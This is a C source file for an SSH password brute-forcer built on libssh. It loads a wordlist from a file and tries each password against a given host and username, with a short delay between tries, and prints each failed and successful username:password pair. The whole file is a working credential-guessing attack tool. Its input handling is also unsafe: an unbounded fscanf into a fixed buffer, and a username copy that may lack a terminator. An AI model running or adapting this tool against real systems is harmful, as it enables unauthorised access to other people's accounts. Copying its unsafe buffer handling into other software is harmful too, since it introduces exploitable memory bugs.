#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libssh/libssh.h>

#define MAX_USERNAME_LENGTH 50
#define MAX_PASSWORD_LENGTH 2000
#define MAX_WORD_LENGTH 50

int authenticate_ssh(const char *hostname, const char *username, const char *password) {
    ssh_session sshSession;
    int authResult;

    // Create a new SSH session
    sshSession = ssh_new();
    if (sshSession == NULL) {
        fprintf(stderr, "Error creating SSH session\n");
        return -1;
    }

    // Set the options for the SSH session
    ssh_options_set(sshSession, SSH_OPTIONS_HOST, hostname);
    ssh_options_set(sshSession, SSH_OPTIONS_USER, username);

    // Connect to the SSH server
    if (ssh_connect(sshSession) != SSH_OK) {
        fprintf(stderr, "Error connecting to %s\n", hostname);
        ssh_free(sshSession);
        return -1;
    }

    // Authenticate with the provided password
    authResult = ssh_userauth_password(sshSession, NULL, password);
    if (authResult != SSH_AUTH_SUCCESS) {
        fprintf(stderr, "Authentication failed: %s\n", ssh_get_error(sshSession));
        ssh_disconnect(sshSession);
        ssh_free(sshSession);
        return -1;
    }

    printf("Authentication successful. Welcome, %s!\n", username);

    // Clean up and disconnect
    ssh_disconnect(sshSession);
    ssh_free(sshSession);

    return 0;
}

int main(int argc , char *argv[]) {
    if (argc != 4){
        printf("Usage: %s <hostname> <username> <pass_wordlists> \n",argv[0]);
        return 1;

    }else{

    // providing credentials 

    char hostname[256];
    strncpy(hostname, argv[1] , sizeof(hostname) -1 );
    hostname[sizeof(hostname) - 1] = '\0'; // Null-terminate the string

    char username[MAX_USERNAME_LENGTH];
    strncpy(username, argv[2] , sizeof(username) -1 );

    char password_path[MAX_PASSWORD_LENGTH];
    strncpy(password_path, argv[3] , sizeof(password_path) -1 );

    // opening password wordlist 

    FILE *file = fopen(password_path,"r");

        if (file == NULL){
            perror("Unable to find file...\n");
            return 1;
        }
    // creating wordlistarry

    char** wordlistarray =NULL; // creating a array list 
    int wordcount = 0;

    while(1){
            char word[MAX_WORD_LENGTH + 1];
            int k = 0;

            int r = fscanf(file, "%s", word); // Read a word based on space-separated words 
            

             if (r == EOF) { // Break if the end of file
                    break;
                }

        char* dynamicWord = strdup(word);

          if (dynamicWord == NULL){
            perror("Memory allocation failed...");
            exit(1);
          }

          wordlistarray =realloc(wordlistarray, (wordcount + 1 ) * sizeof(char*));
          if (wordlistarray == NULL ){
            perror("Memory allocation failed...");
            exit(1);
          }

          wordlistarray[wordcount++]= dynamicWord;
}


//looping through the array 

int authenticationSuccess = 0; // Flag to indicate successful authentication
    int i = 0; // Counter for the password array

    // Loop until authentication is successful or end of password list is reached
    while (!authenticationSuccess && i < wordcount) {
        // Call the SSH authentication function
        sleep(4);
        if (authenticate_ssh(hostname, username, wordlistarray[i]) == 0) {
            printf("Authentication successful for %s:%s\n", username, wordlistarray[i]);
            authenticationSuccess = 1; // Set flag to exit the loop
        } else {
            fprintf(stderr, "Failed to authenticate: %s : %s\n", username, wordlistarray[i]);
            i++; 
        }
    

}




   


}
    return 0;
}
